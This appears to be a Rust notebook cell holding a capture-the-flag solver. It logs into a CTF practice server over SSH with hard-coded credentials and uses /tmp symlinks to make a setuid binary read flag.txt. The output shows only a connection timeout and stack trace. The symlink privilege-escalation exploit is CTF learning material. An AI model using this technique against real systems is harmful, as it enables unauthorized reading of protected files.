In [5]:
:dep ssh2 = { version = "0.9" }

In [6]:
use ssh2::Session;
use std::io::Read;
use std::net::TcpStream;
use std::fs;

fn exec_command(sess: &Session, cmd: &str) -> String {
    let mut channel = sess.channel_session().expect("channel open failed");
    channel.exec(cmd).expect("exec failed");
    let mut output = String::new();
    channel.read_to_string(&mut output).unwrap();
    channel.wait_close().unwrap();
    output
}

{
    let host = "ctfq.u1tramarine.blue:10013";
    let user = "q13";
    let pass = "8zvWx00MakSCQuGq";

    println!("[*] Connecting to {} as {}", host, user);

    let tcp = TcpStream::connect(host).expect("TCP connect failed");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().expect("SSH handshake failed");
    sess.userauth_password(user, pass).expect("Auth failed");

    println!("[+] SSH connected!");

    // ホームディレクトリ確認
    let out = exec_command(&sess, "ls -la ~");
    println!("[*] Home directory:\n{}", out);

    // /tmp に自分専用サブディレクトリ作成
    let tmpdir = "/tmp/rust_solver_q13";
    exec_command(&sess, &format!("rm -rf {}", tmpdir));
    exec_command(&sess, &format!("mkdir -p {}", tmpdir));
    println!("[*] Created tmpdir: {}", tmpdir);

    // proverbバイナリへのシンボリックリンクを作成
    exec_command(
        &sess,
        &format!("ln -s /home/q13/proverb {}/proverb", tmpdir),
    );

    // flag.txt を proverb.txt として参照させるシンボリックリンク
    exec_command(
        &sess,
        &format!("ln -s /home/q13/flag.txt {}/proverb.txt", tmpdir),
    );

    println!("[*] Symlinks created:");
    let links = exec_command(&sess, &format!("ls -la {}", tmpdir));
    println!("{}", links);

    // proverb (setuid) を tmpdir から実行 → flag.txt を読む
    let flag = exec_command(&sess, &format!("cd {} && ./proverb", tmpdir));
    fs::write("flag.txt", flag.trim()).unwrap();

    // 後片付け
    exec_command(&sess, &format!("rm -rf {}", tmpdir));
    println!("[*] Cleaned up.");
}


[*] Connecting to ctfq.u1tramarine.blue:10013 as q13



thread '<unnamed>' (21672) panicked at src\lib.rs:42:40:
TCP connect failed: Os { code: 10060, kind: TimedOut, message: "接続済みの呼び出し先が一定の時間を過ぎても正しく応答しなかったため、接続できませんでした。または接続済みのホストが応答しなかったため、確立された接続は失敗しました。" }
stack backtrace:
   0: std::panicking::panic_handler
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\std\src\panicking.rs:689
   1: core::panicking::panic_fmt
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\core\src\panicking.rs:80
   2: core::result::unwrap_failed
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\core\src\result.rs:1867
   3: <unknown>
   4: <unknown>
   5: <unknown>
   6: <unknown>
   7: <unknown>
   8: <unknown>
   9: <unknown>
  10: <unknown>
  11: <unknown>
  12: BaseThreadInitThunk
  13: RtlUserThreadStart
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
